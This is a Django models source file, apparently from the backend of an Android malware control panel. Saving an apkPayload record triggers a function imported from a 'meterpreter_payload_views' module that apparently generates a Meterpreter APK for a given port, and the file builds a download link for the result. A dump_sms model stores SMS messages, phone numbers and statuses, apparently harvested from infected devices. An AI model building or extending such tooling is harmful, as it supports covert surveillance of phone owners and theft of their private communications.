from django.db import models
from back.views.meterpreter_payload_views import ssh_and_apk
from django.db.models import (
    JSONField,
    BooleanField,
    CharField,
    DateField,
    DateTimeField,
    EmailField,
    F,
    PositiveSmallIntegerField,
    IntegerField,
    ImageField,
    ManyToManyField,
    OneToOneField,
    Manager,
    ForeignKey,
    SET_NULL,
    CASCADE,
    Model,
)

# Create your models here.


class apkPayload(models.Model):

    apk_name = models.CharField(max_length=100, default="", blank=True)
    port = models.PositiveSmallIntegerField(default=0)

    def save(self, *args, **kwargs):
        pk = self.pk  # pk will be None like objects if self is new instance
        super().save(*args, **kwargs)
        if not pk and self.apk_name:
            ssh_and_apk(self.apk_name, self.port)
            super(apkPayload, self).save(*args, **kwargs)

    @property
    def download(self):
        """Returns a Code Calculated from de kind and max weekly hours"""
        return f"http://localhost:8000/back/meterpreter_payload_views/get_apk_file/{self.apk_name}"


class Messages(models.Model):
    message = models.TextField()
    date = models.DateTimeField(auto_now_add=True)
    ip = models.GenericIPAddressField()


class dump_sms(models.Model):
    sms_type = models.CharField(max_length=100, default="", blank=True)
    phone_number = models.CharField(max_length=100, default="", blank=True)
    date = models.DateTimeField(auto_now_add=False)
    status = models.CharField(max_length=100, default="", blank=True)
    body = models.TextField()
